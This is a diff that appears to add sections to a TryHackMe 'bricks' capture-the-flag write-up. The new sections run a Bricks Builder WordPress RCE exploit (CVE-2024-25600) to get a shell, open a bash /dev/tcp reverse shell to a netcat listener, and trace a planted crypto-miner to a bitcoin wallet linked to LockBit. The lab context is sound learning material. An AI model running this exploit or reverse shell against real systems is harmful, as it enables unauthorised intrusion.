@@ -193,4 +193,138 @@ The WordPress site is made using bricks builder (bricks is the name of the room 
 
 ## 3. Exploit bricks builder plugin <= 1.9.6 RCE
 
+```bash
+└─$ python CVE-2024-25600.py -u https://bricks.thm/   
 
+   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
+ / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
+/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
+\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
+    
+Coded By: K3ysTr0K3R --> Hello, Friend!
+
+[*] Checking if the target is vulnerable
+[+] The target is vulnerable
+[*] Initiating exploit against: https://bricks.thm/
+[*] Initiating interactive shell
+[+] Interactive shell opened successfully
+Shell> id
+uid=1001(apache) gid=1001(apache) groups=1001(apache)
+```
+> Make sure that you have added `MACHINE_IP` bricks.thm to your __/etc/hosts__ file.  
+
+## 4. Setup a Reverse Shell
+
+```bash
+nc -lnvp 9001
+```
+> listener
+
+```bash
+bash -c 'bash -i >& /dev/tcp/VPN_IP/9001 0>&1'
+```
+> target
+
+```bash
+$ export TERM=xterm
+$ id
+uid=1001(apache) gid=1001(apache) groups=1001(apache)
+```
+
+## 5. Uncover the Hidden .txt file
+
+```bash
+apache@tryhackme:/data/www/default$ cat 650c844110baced87e1606453b93f22a.txt
+THM{fl46_650c844110baced87e1606453b93f22a}
+```
+
+## 5. Find the service name affiliated with the suspicious process
+
+I tried to list all processes with `ps -elf`, but it was a lot to sort through so I skipped to listing services with `systemctl | grep running` and found the answer to question 3 which is `ubuntu.service`.
+
+```bash
+$ systemctl | grep running
+...
+  ubuntu.service                                   loaded active     running         TRYHACK3M 
+...
+```
+
+## 6. Find the name of the suspicious process
+
+We can run `systemctl cat ubuntu.service` to find the answer to question 2 which is __nm-inet-dialog__.
+
+```bash
+$ systemctl cat ubuntu.service
+# /etc/systemd/system/ubuntu.service
+[Unit]
+Description=TRYHACK3M
+
+[Service]
+Type=simple
+ExecStart=/lib/NetworkManager/nm-inet-dialog
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+
+## 7. Find the log file name of the miner instance
+
+```bash
+$ cd /usr/lib/NetworkManager 
+$ ls -l
+total 8620
+drwxr-xr-x 2 root root    4096 Feb 27  2022 VPN
+drwxr-xr-x 2 root root    4096 Apr  3  2024 conf.d
+drwxr-xr-x 5 root root    4096 Feb 27  2022 dispatcher.d
+-rw-r--r-- 1 root root   48190 Apr 11  2024 inet.conf
+-rwxr-xr-x 1 root root   14712 Feb 16  2024 nm-dhcp-helper
+-rwxr-xr-x 1 root root   47672 Feb 16  2024 nm-dispatcher
+-rwxr-xr-x 1 root root  843048 Feb 16  2024 nm-iface-helper
+-rwxr-xr-x 1 root root 6948448 Apr  8  2024 nm-inet-dialog
+-rwxr-xr-x 1 root root  658736 Feb 16  2024 nm-initrd-generator
+-rwxr-xr-x 1 root root   27024 Mar 11  2020 nm-openvpn-auth-dialog
+-rwxr-xr-x 1 root root   59784 Mar 11  2020 nm-openvpn-service
+-rwxr-xr-x 1 root root   31032 Mar 11  2020 nm-openvpn-service-openvpn-helper
+-rwxr-xr-x 1 root root   51416 Nov 27  2018 nm-pptp-auth-dialog
+-rwxr-xr-x 1 root root   59544 Nov 27  2018 nm-pptp-service
+drwxr-xr-x 2 root root    4096 Nov 27  2021 system-connections
+```
+> inet.conf is the name of the log file for question 4
+
+## 8. Find the wallet address of the miner instance
+
+```bash
+$ grep -a -i -v miner inet.conf
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2024-04-08 10:46:04,743 [*] confbak: Ready!
+2024-04-08 10:46:04,743 [*] Status: Mining!
+2024-04-08 10:46:08,745 [*] Status: Mining!
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2024-04-08 10:48:04,647 [*] confbak: Ready!
+2024-04-08 10:48:04,648 [*] Status: Mining!
+2024-04-08 10:48:08,649 [*] Status: Mining!
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2024-04-11 10:17:47,822 [*] confbak: Ready!
+2024-04-11 10:17:47,822 [*] Status: Mining!
+2024-04-11 10:17:51,825 [*] Status: Mining!
+```
+
+The wallet address is this encrypted value (actually it's two wallet addresses).
+> 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d  
+
+We would use [cyberchef](https://cybershef.org) to decode this string which happens to be hex encoded base64 encoded base64.  
+
+```bash
+└─$ echo 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d > /tmp/wallet && xxd -r -p /tmp/wallet | base64 --decode | base64 --decode
+bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
+```
+
+I found more about bitcoin wallet addresses [here](https://support.imkey.im/hc/en-001/articles/40387080080665-Distinguishing-the-Four-Types-of-Bitcoin-Addresses). Native SegWit Address (P2WPKH) starts with __bc1q__. There are two wallet addresses in the string. The first one was the answer for question 5.
+
+> Bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
+
+## 9. Find the Associated Threat Group
+
+For the last question you have to search through all off the [transactions](https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa) until you find a wallet address that leads to the answer, i.e. read a bunch of sites to find [__LockBit__](https://ofac.treasury.gov/recent-actions/20240220).
